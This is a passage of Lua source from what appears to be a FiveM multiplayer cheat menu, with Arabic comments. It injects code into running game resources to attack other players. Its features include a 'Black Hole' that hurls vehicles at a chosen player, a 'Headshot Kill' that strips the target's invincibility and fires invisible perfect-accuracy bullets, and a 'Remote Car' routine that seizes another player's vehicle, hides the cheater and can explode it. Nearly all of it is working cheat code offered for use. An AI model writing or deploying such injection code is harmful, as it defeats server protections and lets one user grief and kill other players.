                                        break -- إذا تم حذف السيارة، إنهاء الحلقة
                                    end
                                    
                                    -- نظام النقل والجذب المحسن
                                    if teleportCooldown <= 0 then
                                        -- المرحلة الأولى: نقل السيارة في موقع عشوائي حول الهدف
                                        local randomOffset = math.random(15, 25) -- مسافة عشوائية بين 15-25 متر
                                        local randomAngle = math.random() * 2 * math.pi -- زاوية عشوائية
                                        
                                        local teleportPos = vector3(
                                            targetPos.x + math.cos(randomAngle) * randomOffset,
                                            targetPos.y + math.sin(randomAngle) * randomOffset,
                                            targetPos.z + math.random(5, 15) -- ارتفاع عشوائي بين 5-15 متر
                                        )
                                        
                                        SetEntityCoordsNoOffset(blackHoleVehicle, teleportPos.x, teleportPos.y, teleportPos.z, false, false, false)
                                        SetEntityVelocity(blackHoleVehicle, 0.0, 0.0, 0.0)
                                        
                                        -- بدء عداد الجذب - وقت أطول للجذب
                                        teleportCooldown = 60 -- 60 إطار للجذب (حوالي 4 ثوان)
                                    else
                                        -- المرحلة الثانية: جذب السيارة نحو الهدف بسرعة معتدلة
                                        local currentVehiclePos = GetEntityCoords(blackHoleVehicle)
                                        local direction = targetPos - currentVehiclePos
                                        local distance = #direction
                                        
                                        if distance > 1.0 then -- تجنب القسمة على صفر
                                            local normalizedDirection = direction / distance
                                            
                                            -- قوة جذب معتدلة تزيد كلما اقتربت السيارة
                                            local basePullForce = 25.0 -- قوة أساسية أقل
                                            local distanceMultiplier = math.max(0.5, 30.0 / distance) -- تزيد القوة مع القرب
                                            local pullForce = basePullForce * distanceMultiplier
                                            
                                            local velocity = normalizedDirection * pullForce
                                            
                                            -- تطبيق السرعة
                                            SetEntityVelocity(blackHoleVehicle, velocity.x, velocity.y, velocity.z)
                                        end
                                        
                                        -- تقليل العداد
                                        teleportCooldown = teleportCooldown - 1
                                        
                                        -- إذا انتهى العداد، إعادة تعيين للنقل مرة أخرى
                                        if teleportCooldown <= 0 then
                                            teleportCooldown = 0
                                        end
                                    end
                                else
                                    -- إذا لم يوجد الهدف، انتظار ولكن استمرار الحلقة
                                    Citizen.Wait(1000)
                                end
                                
                                Citizen.Wait(100) -- تحديث كل 100 مللي ثانية لسرعة أبطأ
                            end
                            
                            -- تنظيف عند إنهاء الحلقة
                            if DoesEntityExist(blackHoleVehicle) then
                                SetEntityAsMissionEntity(blackHoleVehicle, false, false)
                                DeleteEntity(blackHoleVehicle)
                            end
                        end
                    end)
                ]])
                MachoMenuNotification("Black Hole", "Black Hole activated on Player ID: " .. GetPlayerServerId(selectedPlayer))
            else
                MachoMenuNotification("Error", "Player not found")
            end
        else
            MachoMenuNotification("Error", "No player selected")
        end
    end,
    function()
        enableBlackHole = false
        MachoInjectResource("any", [[
            blackHoleActive = false
            blackHoleVehicle = nil
            teleportCooldown = 0
        ]])
        MachoMenuNotification("Black Hole", "Black Hole deactivated")
    end
)
MachoMenuButton(PlayerSection, "Headshot Kill", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()
    
    if not selectedPlayer then
        MachoMenuNotification("Error", "No player selected! Select a player from the list first.")
        return
    end
    
    local targetPed = GetPlayerPed(selectedPlayer)
    if not DoesEntityExist(targetPed) then
        MachoMenuNotification("Error", "Target player not found!")
        return
    end
    
    MachoInjectResource("any", [[
        Citizen.CreateThread(function()
            local targetPed = GetPlayerPed(]] .. selectedPlayer .. [[)
            local myPed = PlayerPedId()
            local currentWeapon = GetSelectedPedWeapon(myPed)
            
            -- التحقق من أن اللاعب يحمل سلاح
            if currentWeapon and currentWeapon ~= GetHashKey("weapon_unarmed") then
                if DoesEntityExist(targetPed) then
                    -- إزالة الحماية من الهدف
                    SetEntityInvincible(targetPed, false)
                    SetEntityCanBeDamaged(targetPed, true)
                    SetEntityProofs(targetPed, false, false, false, false, false, false, false, false)
                    
                    -- الحصول على إحداثيات الرأس بطريقة أدق
                    local headBone = GetPedBoneIndex(targetPed, 31086)
                    local headCoords = GetWorldPositionOfEntityBone(targetPed, headBone)
                    
                    -- إذا لم نحصل على إحداثيات الرأس، استخدم الموقع العادي مع إضافة ارتفاع
                    if headCoords.x == 0.0 and headCoords.y == 0.0 and headCoords.z == 0.0 then
                        local targetPos = GetEntityCoords(targetPed)
                        headCoords = vector3(targetPos.x, targetPos.y, targetPos.z + 0.6)
                    end
                    
                    -- الحصول على ضرر السلاح الحالي
                    local weaponDamage = GetWeaponDamage(currentWeapon, 0)
                    
                    -- إزالة الارتداد
                    SetWeaponRecoilShakeAmplitude(currentWeapon, 0.0)
                    SetPlayerWeaponDamageModifier(PlayerId(), 1.0)
                    
                    -- الطلقة الأولى من جانب الرأس الأيمن
                    local shootPos1 = vector3(headCoords.x + 1.5, headCoords.y, headCoords.z)
                    ShootSingleBulletBetweenCoords(
                        shootPos1.x, shootPos1.y, shootPos1.z,
                        headCoords.x, headCoords.y, headCoords.z,
                        weaponDamage, -- استخدام ضرر السلاح الحالي
                        true, -- perfectAccuracy
                        currentWeapon, -- استخدام السلاح الحالي
                        myPed,
                        true, -- isAudible
                        true, -- isInvisible (مخفية)
                        3000.0 -- speed عالية
                    )
                    
                    Citizen.Wait(50) -- انتظار قصير بين الطلقتين
                    
                    -- الطلقة الثانية من جانب الرأس الأيسر
                    local shootPos2 = vector3(headCoords.x - 1.5, headCoords.y, headCoords.z)
                    ShootSingleBulletBetweenCoords(
                        shootPos2.x, shootPos2.y, shootPos2.z,
                        headCoords.x, headCoords.y, headCoords.z,
                        weaponDamage, -- استخدام ضرر السلاح الحالي
                        true, -- perfectAccuracy
                        currentWeapon, -- استخدام السلاح الحالي
                        myPed,
                        true, -- isAudible
                        true, -- isInvisible (مخفية)
                        3000.0 -- speed عالية
                    )
                else
                    -- إشعار إذا لم يتم العثور على الهدف
                end
            else
                -- إشعار إذا لم يكن يحمل سلاح
            end
        end)
    ]])
    
    local targetName = GetPlayerName(selectedPlayer)
    MachoMenuNotification("Headshot", "Headshots fired at " .. targetName .. " using your current weapon")
end)

MachoMenuText(PlayerSection,"Vehicle Trolls")
-- Define DUI variables in a wider scope for accessibility
local menuDUI = nil
local menuVisible = false
local HELP_URL = "https://nitwit123.github.io/carauction/"

-- Use MachoMenuCheckbox with two callbacks: one for enabling, one for disabling.
MachoMenuCheckbox(PlayerSection, "Remote Car", 
    -- CallbackEnabled: This code runs when the checkbox is selected (enabling remote control)
    function()
        local selectedPlayer = MachoMenuGetSelectedPlayer()
        
        if selectedPlayer and selectedPlayer ~= -1 then
            local targetPed = GetPlayerPed(selectedPlayer)
            
            if targetPed and DoesEntityExist(targetPed) then
                local targetVehicle = GetVehiclePedIsIn(targetPed, false)
                
                if targetVehicle ~= 0 then
                    local playerPed = PlayerPedId()
                    ClearPedTasksImmediately(playerPed)

                    local originalPos = GetEntityCoords(playerPed)
                    local originalHeading = GetEntityHeading(playerPed)

                    local targetResource = nil
                    local resourcePriority = {"any", "any", "any"}
                    local foundResources = {}
                    for _, resourceName in ipairs(resourcePriority) do
                        if GetResourceState(resourceName) == "started" then
                            table.insert(foundResources, resourceName)
                        end
                    end
                    
                    if #foundResources > 0 then
                        targetResource = foundResources[math.random(1, #foundResources)]
                    else
                        local allResources = {}
                        for i = 0, GetNumResources() - 1 do
                            local resourceName = GetResourceByFindIndex(i)
                            if resourceName and GetResourceState(resourceName) == "started" then
                                table.insert(allResources, resourceName)
                            end
                        end
                        if #allResources > 0 then
                            targetResource = allResources[math.random(1, #allResources)]
                        end
                    end

                    if targetResource then
                        -- Create the help menu (DUI) on the local player's machine.
                        if not GetCurrentResourceName then
                            return
                        end
                        
                        menuDUI = MachoCreateDui(HELP_URL)
                        if not menuDUI then
                            MachoMenuNotification("Remote Car", "Failed to create help menu.")
                            return
                        end
                        Citizen.Wait(1000)
                        MachoShowDui(menuDUI)
                        menuVisible = true
                        
                        -- Loop to handle showing/hiding the menu.
                        Citizen.CreateThread(function()
                            while menuDUI do
                                Citizen.Wait(0)
                                if IsControlJustPressed(0, 167) then -- You can change the open button
                                    menuVisible = not menuVisible
                                    if menuVisible then
                                        MachoShowDui(menuDUI)
                                    else
                                        MachoHideDui(menuDUI)
                                    end
                                end
                            end
                        end)
                        
                        -- Inject the remote control logic into the target resource.
                        MachoInjectResource("any", [[
                        Citizen.CreateThread(function()
                            local playerPed = PlayerPedId()
                            local targetPed = GetPlayerPed(]] .. selectedPlayer .. [[)
                            local targetVehicle = GetVehiclePedIsIn(targetPed, false)
                            local originalPos = vector3(]] .. originalPos.x .. [[, ]] .. originalPos.y .. [[, ]] .. originalPos.z .. [[)
                            local originalHeading = ]] .. originalHeading .. [[

                            if targetVehicle ~= 0 then
                                SetVehicleDoorsLocked(targetVehicle, 1)
                                SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)

                                SetEntityVisible(playerPed, false, false)

                                TaskLeaveVehicle(targetPed, targetVehicle, 0)

                                SetPedMoveRateOverride(playerPed, 10.0)

                                ClearPedTasks(playerPed)
                                SetVehicleForwardSpeed(targetVehicle, 0.0)

                                TaskEnterVehicle(playerPed, targetVehicle, 50, -1, 2.0, 8, 0)

                                -- إضافة حلقة انتظار للحصول على التحكم بالمركبة
                                local hasControl = false
                                local timeout = 0
                                while not hasControl and timeout < 200 do
                                    Citizen.Wait(10)
                                    if NetworkHasControlOfEntity(targetVehicle) then
                                        hasControl = true
                                    else
                                        NetworkRequestControlOfEntity(targetVehicle)
                                    end
                                    timeout = timeout + 1
                                end

                                if not hasControl then
                                    MachoMenuNotification("Remote Car", "Failed to get control of the vehicle. Aborting.")
                                    SetEntityVisible(playerPed, true, false)
                                    return
                                end
                                
                                -- ⭐️ إضافة فترة انتظار مدتها ثانيتان بعد الحصول على الصلاحية ⭐️
                                Citizen.Wait(600)

                                local keepHidden = true
                                Citizen.CreateThread(function()
                                    while keepHidden do
                                        SetEntityVisible(playerPed, false, false)
                                        Citizen.Wait(10)
                                    end
                                end)

                                Citizen.Wait(500)
                                keepHidden = false

                                ClearPedTasksImmediately(playerPed)

                                SetEntityAsMissionEntity(playerPed, true, true)

                                SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                                SetEntityHeading(playerPed, originalHeading)

                                for i = 1, 50 do
                                    SetEntityVisible(playerPed, false, false)
                                    Citizen.Wait(10)
                                end

                                Citizen.Wait(100)

                                ClearPedTasksImmediately(playerPed)

                                SetPedMoveRateOverride(playerPed, 1.0)
                                SetEntityVelocity(playerPed, 0.1, 0.1, 0.0)
                                TaskWanderStandard(playerPed, 0.0, 0)
                                Citizen.Wait(100)
                                ClearPedTasksImmediately(playerPed)

                                SetEntityVisible(playerPed, false, false)

                                Citizen.Wait(100)

                                ClearPedTasksImmediately(playerPed)
                                SetPedMoveRateOverride(playerPed, 1.0)
                                SetEntityAsMissionEntity(playerPed, false, false)

                                SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                                SetEntityHeading(playerPed, originalHeading)

                                Citizen.Wait(100)

                                TaskGoStraightToCoord(playerPed, originalPos.x + 0.5, originalPos.y + 0.5, originalPos.z, 1.0, 500, originalHeading, 0.1)

                                Citizen.Wait(600)

                                ClearPedTasks(playerPed)

                                -- بدء نظام Remote Car الكامل
                                if DoesEntityExist(targetVehicle) then
                                    local RemoteCar = {}
                                    local isSpectating = false
                                    local originalPlayerPed = nil
                                    local audioEnabled = true
                                    local originalAudioPos = nil
                                    local isFlying = false
                                    local flightSpeed = 25.0
                                    local flightAcceleration = 0.2
                                    local isHonking = false
                                    local originalLightState = 0

                                    RemoteCar.Start = function()
                                        local selectedVehicle = targetVehicle
                                        if not selectedVehicle or not DoesEntityExist(selectedVehicle) then
                                            return
                                        end
                                        RemoteCar.Entity = selectedVehicle
                                        RemoteCar.OriginalPed = PlayerPedId()
                                        originalAudioPos = GetEntityCoords(RemoteCar.OriginalPed)
                                        originalLightState = GetVehicleLightsState(RemoteCar.Entity) and 2 or 0
                                        local success = pcall(function()
                                            RemoteCar.CreateBotDriver()
                                        end)
                                        if not success then
                                            return
                                        end
                                        RemoteCar.StartSpectate()
                                        RemoteCar.SetupAudioSystem()
                                        Citizen.CreateThread(function()
                                            while RemoteCar.Entity and DoesEntityExist(RemoteCar.Entity) and RemoteCar.BotPed and DoesEntityExist(RemoteCar.BotPed) do
                                                Citizen.Wait(0)
                                                pcall(function()
                                                    RemoteCar.UpdateAudioPosition()
                                                end)
                                                if isSpectating then
                                                    DisableControlAction(0, 30, true)
                                                    DisableControlAction(0, 31, true)
                                                    DisableControlAction(0, 21, true)
                                                    DisableControlAction(0, 22, true)
                                                    DisableControlAction(0, 44, true)
                                                    DisableControlAction(0, 55, true)
                                                    DisableControlAction(0, 76, true)
                                                    DisableControlAction(0, 23, true)
                                                    DisableControlAction(0, 75, true)
                                                    DisableControlAction(0, 101, true)
                                                    DisableControlAction(0, 102, true)
                                                    DisableControlAction(0, 26, true)
                                                    DisableControlAction(0, 0, true)
                                                    DisableControlAction(0, 140, true)
                                                    DisableControlAction(0, 141, true)
                                                    DisableControlAction(0, 142, true)
                                                    DisableControlAction(0, 143, true)
                                                    DisableControlAction(0, 263, true)
                                                    DisableControlAction(0, 264, true)
                                                    DisableControlAction(0, 24, true)
                                                    DisableControlAction(0, 25, true)
                                                    EnableControlAction(0, 172, true)
                                                    EnableControlAction(0, 173, true)
                                                    EnableControlAction(0, 174, true)
                                                    EnableControlAction(0, 175, true)
                                                    EnableControlAction(0, 32, true)
                                                    EnableControlAction(0, 33, true)
                                                    EnableControlAction(0, 34, true)
                                                    EnableControlAction(0, 35, true)
                                                    EnableControlAction(0, 22, true)
                                                    EnableControlAction(0, 21, true)
                                                    EnableControlAction(0, 47, true)
                                                    EnableControlAction(0, 73, true)
                                                    EnableControlAction(0, 246, true)
                                                    EnableControlAction(0, 44, true)
                                                    EnableControlAction(0, 48, true)
                                                    EnableControlAction(0, 108, true)
                                                    EnableControlAction(0, 23, true)
                                                    EnableControlAction(0, 51, true)
                                                end
                                                if RemoteCar.OriginalPed and DoesEntityExist(RemoteCar.OriginalPed) then
                                                    local distance = GetDistanceBetweenCoords(
                                                        GetEntityCoords(RemoteCar.OriginalPed),
                                                        GetEntityCoords(RemoteCar.Entity),
                                                        true
                                                    )
                                                    pcall(function()
                                                        RemoteCar.HandleKeys(distance)
                                                    end)
                                                    local vehicleCoords = GetEntityCoords(RemoteCar.Entity)
                                                    if vehicleCoords then
                                                        SetFocusPosAndVel(vehicleCoords.x, vehicleCoords.y, vehicleCoords.z, 0.0, 0.0, 0.0)
                                                    end
                                                    if distance <= 2000.0 then
                                                        if not NetworkHasControlOfEntity(RemoteCar.BotPed) then
                                                            NetworkRequestControlOfEntity(RemoteCar.BotPed)
                                                        end
                                                        if not NetworkHasControlOfEntity(RemoteCar.Entity) then
                                                            NetworkRequestControlOfEntity(RemoteCar.Entity)
                                                        end
                                                    else
                                                        pcall(function()
                                                            TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 6, 2500)
                                                        end)
                                                    end
                                                else
                                                    break
                                                end
                                            end
                                            pcall(function()
                                                RemoteCar.Stop()
                                                ClearFocus()
                                            end)
                                        end)
                                    end

                                    RemoteCar.SetupAudioSystem = function()
                                        audioEnabled = true
                                        Citizen.CreateThread(function()
                                            while RemoteCar.Entity and DoesEntityExist(RemoteCar.Entity) do
                                                Citizen.Wait(100)
                                                pcall(function()
                                                    RemoteCar.UpdateAudioPosition()
                                                end)
                                            end
                                        end)
                                    end

                                    RemoteCar.UpdateAudioPosition = function()
                                        if not RemoteCar.Entity or not DoesEntityExist(RemoteCar.Entity) then
                                            return
                                        end
                                        pcall(function()
                                            local vehicleCoords = GetEntityCoords(RemoteCar.Entity)
                                            SetAudioListenerPosition(vehicleCoords.x, vehicleCoords.y, vehicleCoords.z)
                                            local velocity = GetEntityVelocity(RemoteCar.Entity)
                                            SetAudioListenerVelocity(velocity.x, velocity.y, velocity.z)
                                            local heading = GetEntityHeading(RemoteCar.Entity)
                                            local radHeading = math.rad(heading)
                                            local forwardX = -math.sin(radHeading)
                                            local forwardY = math.cos(radHeading)
                                            SetAudioListenerOrientation(forwardX, forwardY, 0.0, 0.0, 0.0, 1.0)
                                            SetAudioFlag("AudioListenerEnabled", true)
                                            SetAudioFlag("LoadMPData", true)
                                            SetAudioFlag("DisableFlightMusic", true)
                                            SetAudioFlag("PauseBeatRepeats", false)
                                        end)
                                    end

                                    RemoteCar.ToggleAudio = function()
                                        audioEnabled = not audioEnabled
                                        if audioEnabled then
                                            pcall(function()
                                                RemoteCar.UpdateAudioPosition()
                                            end)
                                            MachoMenuNotification("Remote Car", "Audio enabled - hearing from vehicle position")
                                        else
                                            pcall(function()
                                                if RemoteCar.OriginalPed and DoesEntityExist(RemoteCar.OriginalPed) then
                                                    local playerCoords = GetEntityCoords(RemoteCar.OriginalPed)
                                                    SetAudioListenerPosition(playerCoords.x, playerCoords.y, playerCoords.z)
                                                    local playerVelocity = GetEntityVelocity(RemoteCar.OriginalPed)
                                                    SetAudioListenerVelocity(playerVelocity.x, playerVelocity.y, playerVelocity.z)
                                                    local playerHeading = GetEntityHeading(RemoteCar.OriginalPed)
                                                    local radHeading = math.rad(playerHeading)
                                                    local forwardX = -math.sin(radHeading)
                                                    local forwardY = math.cos(radHeading)
                                                    SetAudioListenerOrientation(forwardX, forwardY, 0.0, 0.0, 0.0, 1.0)
                                                end
                                            end)
                                            MachoMenuNotification("Remote Car", "Audio disabled - returned to normal audio")
                                        end
                                    end

                                    RemoteCar.RestoreOriginalAudio = function()
                                        pcall(function()
                                            SetAudioFlag("AudioListenerEnabled", false)
                                            ClearAudioFlags()
                                            if RemoteCar.OriginalPed and DoesEntityExist(RemoteCar.OriginalPed) then
                                                local playerCoords = GetEntityCoords(RemoteCar.OriginalPed)
                                                SetAudioListenerPosition(playerCoords.x, playerCoords.y, playerCoords.z)
                                                SetAudioListenerVelocity(0.0, 0.0, 0.0)
                                                SetAudioListenerOrientation(0.0, 1.0, 0.0, 0.0, 0.0, 1.0)
                                            end
                                        end)
                                    end

                                    RemoteCar.CreateBotDriver = function()
                                        if not RemoteCar.Entity or not DoesEntityExist(RemoteCar.Entity) then
                                            return
                                        end
                                        RemoteCar.OriginalPed = PlayerPedId()

                                        pcall(function()
                                            local existingDriver = GetPedInVehicleSeat(RemoteCar.Entity, -1)
                                            if existingDriver and existingDriver ~= 0 and existingDriver ~= RemoteCar.OriginalPed then
                                                if not IsPedAPlayer(existingDriver) then
                                                    SetEntityAsMissionEntity(existingDriver, false, false)
                                                    DeleteEntity(existingDriver)
                                                else
                                                    TaskLeaveVehicle(existingDriver, RemoteCar.Entity, 0)
                                                end
                                            end
                                            for seat = 0, GetVehicleMaxNumberOfPassengers(RemoteCar.Entity) - 1 do
                                                local passenger = GetPedInVehicleSeat(RemoteCar.Entity, seat)
                                                if passenger and passenger ~= 0 and not IsPedAPlayer(passenger) then
                                                    SetEntityAsMissionEntity(passenger, false, false)
                                                    DeleteEntity(passenger)
                                                end
                                            end
                                        end)

                                        if not DoesEntityExist(RemoteCar.Entity) then
                                            return
                                        end

                                        local modelHash = GetHashKey("mp_m_freemode_01")

                                        RequestModel(modelHash)
                                        local timeout = 0
                                        while not HasModelLoaded(modelHash) and timeout < 20 do
                                            Citizen.Wait(10)
                                            timeout = timeout + 1
                                        end

                                        if not HasModelLoaded(modelHash) or not DoesEntityExist(RemoteCar.Entity) then
                                            return
                                        end

                                        -- إنشاء البوت بطريقة client side فقط
                                        local coords = GetEntityCoords(RemoteCar.Entity)
                                        local heading = GetEntityHeading(RemoteCar.Entity)

                                        local success, botPed = pcall(function()
                                            return CreatePed(5, modelHash, coords.x, coords.y, coords.z, heading, false, false)
                                        end)

                                        if not success or not botPed or botPed == 0 then
                                            return
                                        end

                                        RemoteCar.BotPed = botPed

                                        pcall(function()
                                            -- جعل البوت client side فقط
                                            SetEntityAsMissionEntity(RemoteCar.BotPed, true, true)
                                            SetEntityInvincible(RemoteCar.BotPed, true)
                                            SetEntityVisible(RemoteCar.BotPed, true)
                                            SetPedAlertness(RemoteCar.BotPed, 0)
                                            SetPedCanRagdoll(RemoteCar.BotPed, false)
                                            SetPedCanBeTargetted(RemoteCar.BotPed, false)
                                            SetPedCanBeDraggedOut(RemoteCar.BotPed, false)

                                            -- إخفاء البوت عن اللاعبين الآخرين
                                            SetEntityVisible(RemoteCar.BotPed, false, false)

                                            -- Thread منفصل لإظهار البوت محلياً فقط
                                            Citizen.CreateThread(function()
                                                while RemoteCar.BotPed and DoesEntityExist(RemoteCar.BotPed) do
                                                    Citizen.Wait(100)
                                                    -- إظهار البوت للاعب الحالي فقط
                                                    SetEntityAlpha(RemoteCar.BotPed, 255, false)
                                                    SetEntityVisible(RemoteCar.BotPed, true, false)
                                                    -- منع رؤية الآخرين للبوت
                                                    for i = 0, 255 do
                                                        if i ~= PlayerId() and NetworkIsPlayerActive(i) then
                                                            SetEntityVisibleToPlayer(i, RemoteCar.BotPed, false)
                                                        end
                                                    end
                                                end
                                            end)
                                        end)

                                        -- إدخال البوت للسيارة
                                        local enterTimeout = 0
                                        while not IsPedInVehicle(RemoteCar.BotPed, RemoteCar.Entity) and enterTimeout < 5 and DoesEntityExist(RemoteCar.Entity) do
                                            Citizen.Wait(20)
                                            enterTimeout = enterTimeout + 1
                                            TaskWarpPedIntoVehicle(RemoteCar.BotPed, RemoteCar.Entity, -1)
                                        end
                                    end

                                    RemoteCar.StartSpectate = function()
                                        if not RemoteCar.BotPed or not DoesEntityExist(RemoteCar.BotPed) then
                                            return
                                        end
                                        if DoesCamExist(RemoteCar.SpectateCamera) then
                                            DestroyCam(RemoteCar.SpectateCamera)
                                        end
                                        local success, camera = pcall(function()
                                            return CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
                                        end)
                                        if not success or not camera then
                                            return
                                        end
                                        RemoteCar.SpectateCamera = camera
                                        SetCamFov(RemoteCar.SpectateCamera, 75.0)
                                        RemoteCar.CameraDistance = 8.0
                                        RemoteCar.CameraHeight = 3.0
                                        RemoteCar.CameraAngleHorizontal = 0.0
                                        RemoteCar.CameraAngleVertical = -10.0
                                        isSpectating = true
                                        RenderScriptCams(1, 0, 0, 1, 1)
                                        Citizen.CreateThread(function()
                                            while isSpectating and RemoteCar.BotPed and DoesEntityExist(RemoteCar.BotPed) do
                                                Citizen.Wait(0)
                                                pcall(function()
                                                    if IsPedInAnyVehicle(RemoteCar.BotPed, false) then
                                                        local vehicle = GetVehiclePedIsIn(RemoteCar.BotPed, false)
                                                        if vehicle and DoesEntityExist(vehicle) then
                                                            local vehicleCoords = GetEntityCoords(vehicle)
                                                            local mouseX = GetDisabledControlNormal(0, 1) * 15.0
                                                            local mouseY = GetDisabledControlNormal(0, 2) * 8.0
                                                            RemoteCar.CameraAngleHorizontal = RemoteCar.CameraAngleHorizontal + mouseX
                                                            RemoteCar.CameraAngleVertical = math.max(-45.0, math.min(45.0, RemoteCar.CameraAngleVertical + mouseY))
                                                            if IsControlPressed(0, 15) then
                                                                RemoteCar.CameraDistance = math.max(3.0, RemoteCar.CameraDistance - 0.5)
                                                            elseif IsControlPressed(0, 16) then
                                                                RemoteCar.CameraDistance = math.min(15.0, RemoteCar.CameraDistance + 0.5)
                                                            end
                                                            local radianHorizontal = math.rad(RemoteCar.CameraAngleHorizontal)
                                                            local radianVertical = math.rad(RemoteCar.CameraAngleVertical)
                                                            local offsetX = math.sin(radianHorizontal) * RemoteCar.CameraDistance * math.cos(radianVertical)
                                                            local offsetY = math.cos(radianHorizontal) * RemoteCar.CameraDistance * math.cos(radianVertical)
                                                            local offsetZ = math.sin(radianVertical) * RemoteCar.CameraDistance
                                                            local cameraPos = vector3(
                                                                vehicleCoords.x + offsetX,
                                                                vehicleCoords.y + offsetY,
                                                                vehicleCoords.z + RemoteCar.CameraHeight + offsetZ
                                                            )
                                                            SetFocusPosAndVel(cameraPos.x, cameraPos.y, cameraPos.z, 0.0, 0.0, 0.0)
                                                            SetCamCoord(RemoteCar.SpectateCamera, cameraPos)
                                                            PointCamAtEntity(RemoteCar.SpectateCamera, vehicle, 0.0, 0.0, 0.0, true)
                                                            DisableControlAction(0, 1, true)
                                                            DisableControlAction(0, 2, true)
                                                            DisableControlAction(0, 15, true)
                                                            DisableControlAction(0, 16, true)
                                                            if IsControlJustPressed(0, 45) then
                                                                RemoteCar.CameraDistance = 8.0
                                                                RemoteCar.CameraHeight = 3.0
                                                                RemoteCar.CameraAngleHorizontal = 0.0
                                                                RemoteCar.CameraAngleVertical = -10.0
                                                            end
                                                            SetTextFont(4)
                                                            SetTextProportional(1)
                                                            SetTextScale(0.0, 0.4)
                                                            SetTextColour(255, 255, 255, 255)
                                                            SetTextEntry("STRING")
                                                            local speed = GetEntitySpeed(vehicle) * 3.6
                                                            local audioStatus = audioEnabled and "ON" or "OFF"
                                                            DrawText(0.02, 0.02)
                                                        end
                                                    end
                                                end)
                                            end
                                        end)
                                    end

                                    RemoteCar.StopSpectate = function()
                                        if isSpectating then
                                            isSpectating = false
                                            pcall(function()
                                                ClearFocus()
                                                if RemoteCar.OriginalPed and DoesEntityExist(RemoteCar.OriginalPed) then
                                                    local playerCoords = GetEntityCoords(RemoteCar.OriginalPed)
                                                    SetFocusPosAndVel(playerCoords.x, playerCoords.y, playerCoords.z, 0.0, 0.0, 0.0)
                                                    ClearFocus()
                                                else
                                                    ClearFocus()
                                                end
                                                RenderScriptCams(0, 0, 0, 1, 0)
                                                if DoesCamExist(RemoteCar.SpectateCamera) then
                                                    DestroyCam(RemoteCar.SpectateCamera)
                                                    RemoteCar.SpectateCamera = nil
                                                end
                                                SetPlayerControl(PlayerId(), true, 0)
                                            end)
                                        end
                                    end

                                    RemoteCar.MakeVehicleExplode = function()
                                        if not RemoteCar.Entity or not DoesEntityExist(RemoteCar.Entity) then
                                            return
                                        end
                                        pcall(function()
                                            ExplodeVehicleInCutscene(RemoteCar.Entity, true)
                                        end)
                                    end

                                    RemoteCar.HandleHonking = function()
                                        if IsControlPressed(0, 51) then
                                            if not isHonking then
                                                isHonking = true
                                                pcall(function()
                                                    SetVehicleDoorOpen(RemoteCar.Entity, 0, false, false)
                                                    SetVehicleDoorOpen(RemoteCar.Entity, 1, false, false)
                                                    SetVehicleDoorOpen(RemoteCar.Entity, 2, false, false)
                                                    SetVehicleDoorOpen(RemoteCar.Entity, 3, false, false)
                                                    SetVehicleDoorOpen(RemoteCar.Entity, 4, false, false)
                                                    SetVehicleDoorOpen(RemoteCar.Entity, 5, false, false)
                                                    SetVehicleDoorOpen(RemoteCar.Entity, 6, false, false)
                                                    SetVehicleDoorOpen(RemoteCar.Entity, 7, false, false)
                                                end)
                                            end
                                        else
                                            if isHonking then
                                                isHonking = false
                                                pcall(function()
                                                    if RemoteCar.Entity and DoesEntityExist(RemoteCar.Entity) then
                                                        for i = 0, 7 do
                                                            SetVehicleDoorShut(RemoteCar.Entity, i, false)
                                                        end
                                                    end
                                                end)
                                            end
                                        end
                                    end

                                    RemoteCar.HandleKeys = function(distance)
                                        if IsControlJustReleased(0, 23) then
                                            isFlying = not isFlying
                                            pcall(function()
                                                if isFlying then
                                                    SetVehicleGravity(RemoteCar.Entity, false)
                                                    SetEntityCollision(RemoteCar.Entity, false, false)
                                                    SetEntityCollision(RemoteCar.BotPed, false, false)
                                                    SetEntityRotation(RemoteCar.Entity, 0.0, 0.0, GetEntityHeading(RemoteCar.Entity), 2, true)
                                                    SetEntityDynamic(RemoteCar.Entity, false)
                                                    SetEntityDynamic(RemoteCar.BotPed, false)
                                                else
                                                    SetVehicleGravity(RemoteCar.Entity, true)
                                                    SetEntityCollision(RemoteCar.Entity, true, true)
                                                    SetEntityCollision(RemoteCar.BotPed, true, true)
                                                    local coords = GetEntityCoords(RemoteCar.Entity)
                                                    SetEntityCoordsNoOffset(RemoteCar.Entity, coords.x, coords.y, coords.z, false, false, false)
                                                    PlaceObjectOnGroundProperly(RemoteCar.Entity)
                                                    SetEntityDynamic(RemoteCar.Entity, true)
                                                    SetEntityDynamic(RemoteCar.BotPed, true)
                                                end
                                            end)
                                        end
                                        if IsControlJustReleased(0, 47) then
                                            if isSpectating then
                                                RemoteCar.StopSpectate()
                                            else
                                                RemoteCar.StartSpectate()
                                            end
                                        end
                                        if IsControlJustPressed(0, 45) then
                                            pcall(function()
                                                if RemoteCar.Entity and DoesEntityExist(RemoteCar.Entity) then
                                                    SetVehicleFixed(RemoteCar.Entity)
                                                    SetVehicleDeformationFixed(RemoteCar.Entity)
                                                    SetVehicleUndriveable(RemoteCar.Entity, false)
                                                    SetVehicleEngineOn(RemoteCar.Entity, true, true, false)
                                                    StopEntityFire(RemoteCar.Entity)
                                                    local coords = GetEntityCoords(RemoteCar.Entity)
                                                    local heading = GetEntityHeading(RemoteCar.Entity)
                                                    SetEntityCoordsNoOffset(RemoteCar.Entity, coords.x, coords.y, coords.z + 1.0, false, false, false)
                                                    SetEntityRotation(RemoteCar.Entity, 0.0, 0.0, heading, 2, true)
                                                    if not isFlying then
                                                        PlaceObjectOnGroundProperly(RemoteCar.Entity)
                                                    end

                                                    if RemoteCar.BotPed and DoesEntityExist(RemoteCar.BotPed) then
                                                        DeleteEntity(RemoteCar.BotPed)
                                                    end

                                                    local modelHash = GetHashKey("mp_m_freemode_01")
                                                    if not HasModelLoaded(modelHash) then
                                                        RequestModel(modelHash)
                                                        while not HasModelLoaded(modelHash) do
                                                            Citizen.Wait(10)
                                                        end
                                                    end

                                                    -- إعادة إنشاء البوت كـ client-side بالكامل
                                                    RemoteCar.BotPed = CreatePedInsideVehicle(RemoteCar.Entity, 5, modelHash, -1, false, false)
                                                    SetEntityAsMissionEntity(RemoteCar.BotPed, true, true)
